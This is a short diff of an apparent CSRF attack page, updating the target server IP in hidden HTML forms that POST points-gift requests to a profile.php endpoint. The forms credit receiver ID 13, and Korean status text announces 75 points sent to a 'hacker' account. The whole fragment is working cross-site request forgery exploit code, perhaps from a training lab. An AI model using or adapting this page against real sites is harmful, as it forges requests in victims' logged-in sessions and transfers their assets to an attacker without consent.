@@ -65,7 +65,7 @@
                 <!DOCTYPE html>
                 <html>
                 <body>
-                    <form id="attackForm${attackNum}" method="POST" action="http://3.35.218.180/profile.php">
+                    <form id="attackForm${attackNum}" method="POST" action="http://3.36.66.216/profile.php">
                         <input type="hidden" name="receiver_id" value="13">
                         <input type="hidden" name="points" value="${attackData.points}">
                         <input type="hidden" name="send_gift" value="1">
@@ -113,7 +113,7 @@
             
             if (newWindow) {
                 const html = `
-                    <form method="POST" action="http://3.35.218.180/profile.php" id="form${attackNum}">
+                    <form method="POST" action="http://3.36.66.216/profile.php" id="form${attackNum}">
                         <input name="receiver_id" value="13">
                         <input name="points" value="${attackData.points}">
                         <input name="send_gift" value="1">
@@ -164,7 +164,7 @@
                 document.getElementById('status').innerHTML = `
                     ✅ 포인트 지급 완료!<br>
                     💰 총 75P가 hacker 계정으로 전송되었습니다<br>
-                    🔍 <a href="http://3.35.218.180" target="_blank" style="color: #FFD700;">여기서 확인하세요</a>
+                    🔍 <a href="http://3.36.66.216" target="_blank" style="color: #FFD700;">여기서 확인하세요</a>
                 `;
             }, 2000);
             
